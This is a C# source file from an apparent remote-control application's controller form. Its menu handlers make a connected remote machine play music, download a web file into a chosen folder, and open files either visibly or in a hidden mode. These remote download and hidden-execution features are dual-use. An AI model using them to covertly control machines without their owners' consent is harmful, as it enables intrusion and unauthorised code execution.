using System;
using System.Collections.Generic;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Server.Utils;

namespace RemoteControl.Server
{
    public partial class FrmMain
    {
        private void 复制全路径ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count < 1)
                return;

            ListViewItem selectedItem = this.listView1.SelectedItems[0];
            ListViewItemFileOrDirTag tag = selectedItem.Tag as ListViewItemFileOrDirTag;
            if (tag == null || string.IsNullOrEmpty(tag.Path))
                return;

            try
            {
                Clipboard.SetText(tag.Path);
            }
            catch (Exception)
            {
                MsgBox.Info("复制到剪切板失败！");
            }
        }

        private void 播放音乐ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count < 1)
                return;

            string path;
            if (!IsListViewItemAFile(this.listView1.SelectedItems[0], out path))
            {
                MsgBox.Info("请选择一个音频文件！");
                return;
            }

            string ext = System.IO.Path.GetExtension(path);
            List<string> exts = new List<string>() { ".mp3", ".wma", ".flac", ".ogg" };
            if (!exts.Contains(ext))
            {
                MsgBox.Info("请选择一个音频文件！");
                return;
            }

            if (this.currentSession != null)
            {
                RequestPlayMusic req = new RequestPlayMusic();
                req.MusicFilePath = path;
                this.currentSession.Send(ePacketType.PACKET_PLAY_MUSIC_REQUEST, req);
            }
        }

        private void 停止播放音乐ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.currentSession != null)
            {
                buttonStopPlayMusic_Click(null, null);
            }
        }

        private void 远程下载到此处ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!IsCurrentSessionValid())
                return;
            if (this.listView1.Tag == null)
                return;

            var frm = new FrmDownloadWebFile();
            frm.FormClosing += (o, args) =>
            {
                if (frm.WebUrl == null || frm.DestFilePath == null)
                    return;

                RequestDownloadWebFile req = new RequestDownloadWebFile();
                req.WebFileUrl = frm.WebUrl;
                string filePath = System.IO.Path.Combine(this.listView1.Tag.ToString(), frm.DestFilePath);
                req.DestinationPath = filePath;
                PostRequstWithCurrentSession(ePacketType.PACKET_DOWNLOAD_WEBFILE_REQUEST, req);
            };
            frm.Show();
        }

        private void 打开文件ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count < 1)
                return;

            string path;
            if (!IsListViewItemAFile(this.listView1.SelectedItems[0], out path))
            {
                MsgBox.Info("请选择一个文件！");
                return;
            }

            if (this.currentSession != null)
            {
                RequestOpenFile req = new RequestOpenFile();
                req.FilePath = path;
                req.IsHide = false;
                this.currentSession.Send(ePacketType.PACKET_OPEN_FILE_REQUEST, req);
            }
        }

        private void 打开文件隐藏模式ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count < 1)
                return;

            string path;
            if (!IsListViewItemAFile(this.listView1.SelectedItems[0], out path))
            {
                MsgBox.Info("请选择一个文件！");
                return;
            }

            if (this.currentSession != null)
            {
                RequestOpenFile req = new RequestOpenFile();
                req.FilePath = path;
                req.IsHide = true;
                this.currentSession.Send(ePacketType.PACKET_OPEN_FILE_REQUEST, req);
            }
        }
    }
}
